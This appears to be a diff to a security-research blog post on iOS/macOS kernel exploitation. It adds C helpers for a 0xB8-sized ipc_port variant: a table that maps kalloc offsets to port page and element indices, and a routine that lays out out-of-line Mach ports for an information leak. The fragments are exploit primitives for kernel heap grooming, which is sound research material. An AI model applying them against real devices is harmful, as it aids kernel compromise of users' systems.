@@ -9,10 +9,11 @@ categories: ios macos exploitation
 * The size of `struct ipc_port` is 168. 
 * The size of kalloc is 4096 * (3 or 4).
 
-# No offset collision
+# ~~No offset collision~~
 There is no offset collision in one kalloc, so if you can get the offset of a `ipc_port`, you can get the port index and page index.
 
 ```c
+// 0xA8
 uint64_t PRTS_GetPageAndElementInfo(uint64_t kObjAddr)
 {
     static uint32_t page0[25] = {
@@ -51,12 +52,60 @@ uint64_t PRTS_GetPageAndElementInfo(uint64_t kObjAddr)
     
     return -1;
 }
+
+
+// 0xB8
+uint64_t PRTS_GetPageAndElementInfo(uint64_t kObjAddr)
+{
+    static uint32_t page0[23] = {
+        0x000, 0x0B8, 0x170, 0x228, 0x2E0, 0x398, 0x450, 0x508, 0x5C0, 0x678,
+        0x730, 0x7E8, 0x8A0, 0x958, 0xA10, 0xAC8, 0xB80, 0xC38, 0xCF0, 0xDA8,
+        0xE60, 0xF18, 0xFD0
+    };
+    
+    static uint32_t page1[23] = {
+        0x088, 0x140, 0x1F8, 0x2B0, 0x368, 0x420, 0x4D8, 0x590, 0x648, 0x700,
+        0x7B8, 0x870, 0x928, 0x9E0, 0xA98, 0xB50, 0xC08, 0xCC0, 0xD78, 0xE30,
+        0xEE8, 0xFA0, 0xFFF
+    };
+    
+    static uint32_t page2[23] = {
+        0x058, 0x110, 0x1C8, 0x280, 0x338, 0x3F0, 0x4A8, 0x560, 0x618, 0x6D0,
+        0x788, 0x840, 0x8F8, 0x9B0, 0xA68, 0xB20, 0xBD8, 0xC90, 0xD48, 0xE00,
+        0xEB8, 0xF70, 0xFFF
+    };
+    
+    static uint32_t page3[23] = {
+        0x028, 0x0E0, 0x198, 0x250, 0x308, 0x3C0, 0x478, 0x530, 0x5E8, 0x6A0,
+        0x758, 0x810, 0x8C8, 0x980, 0xA38, 0xAF0, 0xBA8, 0xC60, 0xD18, 0xDD0,
+        0xE88, 0xF40, 0xFFF
+    };
+    
+    static uint32_t *pages[] = {
+        page0, page1, page2, page3
+    };
+    
+    uint32_t offset = kObjAddr & 0xFFF;
+    
+    int pgCnt = sizeof(pages) / sizeof(uint32_t *);
+    int itemCnt = sizeof(page0) / sizeof(uint32_t);
+    for (int pgIdx = 0; pgIdx < pgCnt; ++pgIdx) {
+        for (int objIdx = 0; objIdx < itemCnt; ++objIdx) {
+            if (pages[pgIdx][objIdx] == offset) {
+                return ((uint64_t)pgIdx << 32) | objIdx;
+            }
+        }
+    }
+    
+    return -1;
+}
 ```
 
 # Info leak by ool ports
 Should pay attention to port layout.
 
 ```c
+// 0xA8
 void PRTS_LayoutPorts(mach_port_t *payloadObjs, int portCnt, mach_port_t infoLeakPort)
 {
     static const int step = (PRTS_PAGE_SIZE / PRTS_PORT_SIZE) + 1;
@@ -74,6 +123,37 @@ void PRTS_LayoutPorts(mach_port_t *payloadObjs, int portCnt, mach_port_t infoLea
     }
     
     // page: 3
+    payloadObjs[2] = infoLeakPort;
+    for (int idx = 5; idx < portCnt; idx += step) {
+        payloadObjs[idx + ctxOffset] = infoLeakPort;
+    }
+}
+
+
+// 0xB8
+void PRTS_LayoutPorts(mach_port_t *payloadObjs, int portCnt, mach_port_t infoLeakPort)
+{
+    static const int step = (PRTS_PAGE_SIZE / PRTS_PORT_SIZE) + 1;
+    static const int ctxOffset = (PRTS_PORT_CTX_OFFSET / 8);
+    
+    // page: 1
+    for (int idx = 0; idx < portCnt; idx += step) {
+        payloadObjs[idx + ctxOffset] = infoLeakPort;
+    }
+    
+    // page: 2
+    payloadObjs[14] = infoLeakPort;
+    for (int idx = 17; idx < portCnt; idx += step) {
+        payloadObjs[idx + ctxOffset] = infoLeakPort;
+    }
+    
+    // page: 3
+    payloadObjs[8] = infoLeakPort;
+    for (int idx = 11; idx < portCnt; idx += step) {
+        payloadObjs[idx + ctxOffset] = infoLeakPort;
+    }
+    
+    // page: 4
     payloadObjs[2] = infoLeakPort;
     for (int idx = 5; idx < portCnt; idx += step) {
         payloadObjs[idx + ctxOffset] = infoLeakPort;
